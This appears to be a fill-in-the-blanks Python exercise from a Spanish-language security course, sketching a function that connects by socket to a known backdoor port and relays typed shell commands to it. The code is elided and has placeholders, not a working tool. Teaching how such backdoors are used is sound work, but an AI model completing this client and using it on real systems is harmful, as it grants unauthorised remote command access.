...
#que abre una puerta trasera en ella.
#*********************************************************************************************************************************
...
def lanzar_exploit(direccion, puerto_destino):
    ...
    try:
        ...
        #Efectuamos la conexión con la dirección que nos han pasado y mediante el puerto oportuno,
        #que es en el que el software tiene abierta una puerta trasera
        #(◕‿−)Cambiar ???? por el puerto correspondiente
        puerta_trasera_socket.connect((direccion, ????))
        ...
        while not ejecuta_exit:
            ...
            comando=input ("$ ")
            #(◕‿−) Si el comando introducido es "exit" -tanto en mayúsculas como en minúsculas- actualizamos el valor de la variable "ejecuta_exit"
            
            else:
            #Enviamos el comando mediante el socket e imprimimos la respuesta que devuelva
                comando = str.encode(comando + '\n')
                #(◕‿−)Enviamos el comando mediante el método send del socket pertinente
...
if __name__ == '__main__':
    try:
        #(◕‿−) Introduce las líneas adecuadas para:
